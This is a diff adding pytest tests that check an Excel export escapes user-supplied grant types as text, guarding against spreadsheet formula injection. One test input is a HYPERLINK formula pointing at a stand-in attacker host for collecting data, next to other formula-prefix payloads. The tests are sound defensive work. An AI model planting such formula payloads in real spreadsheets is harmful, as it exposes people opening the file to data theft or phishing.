@@ -67,3 +67,55 @@ def test_roundtrip_generates_correct_events():
     timeline = compute_timeline(events, initial_price)
     assert len(events) == 89
     assert timeline[-1]["cum_shares"] == 558500
+
+
+# ── Writer: formula injection ────────────────────────────────────────────────
+
+def _event(**over):
+    from datetime import datetime
+    evt = {
+        "date": datetime(2021, 1, 1), "grant_year": 2021, "grant_type": "Purchase",
+        "event_type": "Grant", "granted_shares": 100, "grant_price": 1.0,
+        "exercise_price": 0.0, "vested_shares": 0, "price_increase": 0.0,
+        "source": None,
+    }
+    evt.update(over)
+    return evt
+
+
+def _write_one(tmp_path, evt):
+    import shutil
+    from app.excel_io import write_events_to_excel
+    path = str(tmp_path / "out.xlsx")
+    shutil.copy(FIXTURE, path)
+    write_events_to_excel(path, [evt], [])
+    wb = openpyxl.load_workbook(path)
+    try:
+        return wb["Events"]["C2"], wb["Events"]["I2"]
+    finally:
+        wb.close()
+
+
+@pytest.mark.parametrize("grant_type", [
+    '=HYPERLINK("https://attacker.example/collect","Open")',
+    '+1+1',
+    '-1+1',
+    '@SUM(A1)',
+])
+def test_user_grant_type_never_becomes_a_formula(tmp_path, grant_type):
+    """A grant type is user input: it is written as text whatever it starts with."""
+    cell, _ = _write_one(tmp_path, _event(grant_type=grant_type))
+    assert cell.data_type != "f"
+    assert cell.value == "'" + grant_type
+
+
+def test_ordinary_grant_type_is_written_unchanged(tmp_path):
+    cell, _ = _write_one(tmp_path, _event(grant_type="Purchase"))
+    assert cell.value == "Purchase"
+
+
+def test_server_formulas_are_still_formulas(tmp_path):
+    """The cumulative-shares column stays a live formula."""
+    _, cum = _write_one(tmp_path, _event())
+    assert cum.data_type == "f"
+    assert cum.value == "=SUM(H$1:H2)"
